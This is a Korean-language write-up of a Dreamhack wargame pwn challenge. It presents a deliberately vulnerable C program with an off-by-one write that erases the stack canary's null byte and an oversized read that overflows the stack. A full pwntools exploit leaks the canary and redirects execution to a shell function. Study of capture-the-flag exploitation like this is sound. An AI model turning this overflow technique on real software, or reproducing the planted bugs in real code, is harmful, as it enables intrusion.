# struct person_t

[문제 링크](https://dreamhack.io/wargame/challenges/1866)

## 소스 코드

```c
// Name: chall.c
// Compile: gcc -Wall -no-pie chall.c -o chall ; strip chall
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

struct person_t {
    char nationality[32];
    char name[56];
    double height;
    int age;
    char male_or_female[4];
};

void get_shell() {
    execve("/bin/sh", 0, 0);
}

void read_input(char *ptr, size_t len) {
    ssize_t readn;

    readn = read(0, ptr, len);
    if (readn < 1) {
        puts("read() error");
        exit(1);
    }

    if (ptr[readn - 1] == '\n') {
        ptr[readn - 1] = '\0';
    }
}

int main() {
    struct person_t person;

    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    printf("Enter name: ");
    read_input(person.name, 56);

    printf("Enter age: ");
    scanf("%d", &person.age);

    printf("Enter height: ");
    scanf("%lf", &person.height);

    printf("Enter M (Male) or F (Female): ");
    read_input(person.male_or_female, 5);

    printf("Hi %s.\n", person.name);

    printf("What's your nationality? ");
    read_input(person.nationality, 128);

    return 0;
}
```

##  취약점 개요 (Vulnerability Summary)
이 프로그램은 struct person_t 구조체를 사용하여 사용자 정보를 입력받습니다. 컴파일 시 스택 카나리(Stack Canary) 보호 기법이 적용되어 있으나, 구조체의 메모리가 연속적으로 할당된다는 점과 입력 함수의 예외 처리가 미흡하다는 점이 결합하여 치명적인 취약점이 발생합니다.

**연속된 메모리 구조 (Contiguous Memory)**: 구조체 내부의 변수(name, age, height, gender)들이 패딩(Padding) 없이 스택에 연속적으로 맞닿아 배치되어 있습니다.

**Null-Byte Overwrite (카나리 노출)**: 카나리의 첫 바이트는 항상 널 바이트(\x00)로 시작하여 문자열 출력 함수(printf)가 카나리를 읽지 못하게 막습니다. 그러나 gender 변수(4바이트)를 입력받을 때 5바이트를 입력받는 오류가 존재하여, 입력값의 마지막 1바이트가 카나리의 첫 번째 널 바이트를 덮어쓰게 됩니다.

**스택 버퍼 오버플로우 (Stack BOF)**: 마지막 nationality (32바이트)를 입력받을 때 최대 128바이트까지 입력을 허용하여, 스택의 카나리, SFP, RET를 모두 덮어쓸 수 있습니다.

## 익스플로잇 설계

1. 입력 시 발생하는 개행 문자(\n) 처리를 우회하기 위해 scanf의 공백 무시 특성을 활용합니다. age, height, gender를 한 번의 전송(-1 1.1 MMMMa)으로 처리합니다.

2. MMMMa의 마지막 'a'가 카나리의 널 바이트를 지웠으므로, 이어지는 printf 함수가 널 바이트를 만날 때까지 스택을 읽어 들이며 숨겨진 카나리 7바이트를 화면에 유출합니다. 이를 수신하여 원본 카나리로 복원합니다.

3. nationality 입력란에 더미(104) + 복원된 카나리(8) + SFP 더미(8) + get_shell 주소(8)를 전송하여 방어막을 무사히 통과하고 실행 흐름을 쉘로 조작합니다.

## 익스플로잇 코드

```python
from pwn import *
import sys

if len(sys.argv) == 3:
    p = remote(sys.argv[1], sys.argv[2])
else :
    p = process("./chall")

get_shell = 0x401216

p.sendafter(b"name: ", b'a' * 56)
p.sendafter(b"age: ", b'-1 1.1 MMMMa')

p.recvuntil(b"MMMMa")
canary_leak = p.recvn(7)
canary = u64(b"\x00" + canary_leak)

log.success(f"카나리: {hex(canary)}")

exploit = b'A'*104
exploit += p64(canary)
exploit += b'B' * 8
exploit += p64(get_shell)

p.sendafter(b"? ", exploit)

p.interactive()
```